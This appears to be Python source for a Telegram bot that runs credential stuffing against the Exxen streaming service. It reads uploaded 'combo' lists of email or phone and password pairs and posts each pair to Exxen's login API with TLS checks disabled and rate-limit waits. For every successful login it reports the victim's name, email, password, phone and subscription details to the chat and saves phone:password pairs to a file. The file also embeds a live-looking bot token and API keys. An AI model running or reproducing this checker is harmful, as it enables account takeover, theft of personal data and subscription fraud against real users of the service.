import os, time
import sys
import re
import asyncio
import shutil
import requests
import json
from config import DOWNLOAD_DIR
from datetime import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from pyrogram.errors import FloodWait, MessageNotModified
from pyrogram import Client, filters

import logging
logging.basicConfig(level = logging.DEBUG,
                     format="%(asctime)s - %(name)s - %(message)s - %(levelname)s")

logger = logging.getLogger(__name__)

import pyrogram
import os

APP_ID=2374174
API_HASH="c23db4aa92da73ff603666812268597a"
BOT_TOKEN="1974636862:AAG2upXULcE2bjqQRXgk1B1XifQzTL-CP5I"

logging.getLogger('pyrogram').setLevel(logging.WARNING)

if __name__ == '__main__':

    if not os.path.isdir('combo'):
        os.mkdir('combo')

    plugins = dict(root='plugins')

    app = pyrogram.Client(
        'Combo',
        bot_token=BOT_TOKEN,
        api_id=APP_ID,
        api_hash=API_HASH
    )

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

directory = f"./{DOWNLOAD_DIR}/"
HitsDocument = "Hits.txt"
ExxenTellPass = "Exxen TelPass.txt"

key = "90d806464edeaa965b75a40a5c090764"
api = "api-crm.exxen.com"


def tel_write(tell):
    file = open(ExxenTellPass, 'a+', encoding="utf8")
    file.write(tell)
    file.close()


headers = {
    "Accept-Language": "en-US;q=1.0",
    "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    "User-Agent": "Exxen/1.0.23 (com.exxen.ios; build:5; iOS 15.4.0) Alamofire/5.4.4",
    "Connection": "keep-alive",
    "Host": "api-crm.exxen.com",
    "Origin": "com.exxen.ios",
    "Content-Type": "application/json;charset=utf-8",
}

regex = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"


def replace(string, substitutions):
    substrings = sorted(substitutions, key=len, reverse=True)
    regex = re.compile('|'.join(map(re.escape, substrings)))
    return regex.sub(lambda match: substitutions[match.group(0)], string)


substitutions = {
    "RKLMYOK Monthly": "Reklam Yok, Aylık 29,90 ₺",
    "RKLMVAR Monthly": "Reklam Var, Aylık 19,90 ₺",
    "RKLMYOK Yearly": "Reklam Yok, Yıllık 299,90 ₺",
    "RKLMVAR Yearly": "Reklam Var, Yıllık 99,90 ₺",
    "Spor Monthly": "Spor, Aylık 39,90 ₺",
    "Spor Yearly": "Spor, Yıllık 298.80 ₺",
    "Spor Seaon": "Spor, Sezon 298.80 ₺"
}


@Client.on_message(filters.command('combo'))
async def cookie(client, message):
    if not message.reply_to_message:
        await message.reply_text("Reply combo.txt", quote=True)
        return
    file_name = message.reply_to_message.document.file_name
    filename, file_extension = os.path.splitext(file_name)
    if message.reply_to_message.media and message.reply_to_message.document and file_extension == '.txt':
        await client.download_media(
            message=message.reply_to_message,
            file_name=DOWNLOAD_DIR + '/',
        )
        await message.reply_text(f"Combo eklendi.\n{file_name}", quote=True)
    else:
        await message.reply_text("Get combo", quote=True)

@Client.on_message(filters.command(['start']))
async def help_message(app, message):
    say = 0
    dsy = ""
    if 1 == 1:
        for files in os.listdir(directory):
            say = say + 1
            dsy = dsy + "	" + str(say) + "-) " + files + '\n'
        await message.reply_text(
            "Choose your combo from the list below." + "\n\n" + dsy + "\n" + str(
                say) + " Files found in your Combo folder.")

        await message.reply("Choose Combo: ", reply_markup=ForceReply(True))

@Client.on_message(filters.reply)
async def api_connect(client, message):
    custom = 0
    total = 0
    hit = 0
    cpm = 1
    done = 0
    if (message.reply_to_message.reply_markup) and isinstance(message.reply_to_message.reply_markup, ForceReply):
        msg = await message.reply_text("**✓ İşlem Başlatılıyor..**", reply_to_message_id=message.message_id)
        try:
            dsyno = int(message.text)
            say = 0
            for files in os.listdir(directory):
                say = say + 1
                if dsyno == say:
                    txt = (directory + files)
        except Exception as c:
            print(c)
            await message.reply_text(f"**Error :** {f}", reply_to_message_id=message.message_id)
        try:
            for mp in open(txt, 'r', encoding="utf8"):
                mr = mp.split(' ')[0]
                mp = mr.replace("\n", "")
                USER = mp.split(':')[0]

                if re.match(regex, USER):
                    check = 'Email'
                else:
                    check_number = str(USER[:1])
                    check = 'Mobile'
                    if check_number == '0':
                        USER = '+9' + USER
                    else:
                        USER = '+90' + USER

                try:
                    PASS = mp.split(':')[1]
                    if len(PASS) == 6:
                        PASS += '00'
                except:
                    PASS = '123456789'

                url = f"https://{api}/membership/login/{check}?key={key}"
                data = {check: USER, 'Password': PASS}

                while True:
                    try:
                        response = session.post(
                            url,
                            headers=headers,
                            data=json.dumps(data),
                            timeout=10,
                            verify=False
                        )
                        if response.status_code == 429:
                            await asyncio.sleep(120)
                        break
                    except requests.exceptions.Timeout as e:
                        print(e)

                total = total + 1
                cpm = (time.time() - cpm)
                cpm = (round(60 / cpm))
                Exxen = str()
                done += 1
                package = 0

                if response.ok:
                    res = response.json()
                    succes = res["Result"]
                    if succes is not None:
                        data = json.dumps(succes, indent=4, sort_keys=True)
                        parse = json.loads(data)

                        user = parse['User']
                        Email = user['Email']
                        Name = user['Name']
                        Surname = user['Surname']
                        Mobile = user['Mobile']
                        CreateDate = user['CreateDate']
                        CreateDate = datetime.fromisoformat(CreateDate)

                        Exxen += (f"●►👤 **Ad-Soyad:** {Name} {Surname}" + "\n"
                                  f"╠●✉ **{check}:** `{Email}`" + "\n"
                                  f"╠●🔑 **Şifre:** `{PASS}`" + "\n"
                                  )

                        if Mobile is not None:
                            Number = Mobile['Number']
                            tel_write(f"{Number}:{PASS}" + "\n")
                            Exxen += f"╠●📞 **Tel:** {Number}" + "\n"

                        Exxen += f"╠●🗓 **H.o.t:** {CreateDate}" + "\n"

                        if parse['Products']:
                            hit = hit + 1
                            for product in parse['Products']:
                                package = package + 1
                                LicenseName = product['LicenseName']
                                PurchaseDate = product['LicenseStartDate']
                                ExpireDate = product['LicenseEndDate']

                                StartDate = datetime.fromisoformat(PurchaseDate)
                                EndDate = datetime.fromisoformat(ExpireDate)
                                Package = replace(LicenseName, substitutions)

                                Exxen += ("║\n"
                                          f"╠●💎 **Paket[{package}]:** {Package}" + "\n"
                                          f"╠●⌛ **Başlangıç:** {StartDate}" + "\n"
                                          f"╠●⏳ **Bitiş:** {EndDate}" + "\n"
                                          )
                        else:
                            custom = custom + 1
                        print(Exxen.replace('**', ''))
                        try:
                            await message.reply_text(
                                "╔╣ **𝙀𝙓𝙓𝙀𝙉**" + Exxen + "╚ ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᴬᶜᵘⁿ ╝",
                                parse_mode='Markdown')
                        except FloodWait as e:
                            time.sleep(e.x * 3 / 2)
                else:
                    print(f"{mp} Cpm: {cpm} Taranan: {total}")
                    cpm = time.time()
                    if not done % 20:
                        try:
                            await msg.edit(f"**Taranan:** {done}")
                        except FloodWait as e:
                            time.sleep(e.x * 3 / 2)
                        except MessageNotModified:
                            Logger.warn(e)

        finally:
            await message.reply_text(
                f"**✓ İşlem Başarıyla Tamamlandı**" + "\n"
                f"➤ **Total:** `{total}` **Hit:** `{hit}` **Custom:** `{custom}`"
            )
app.run()
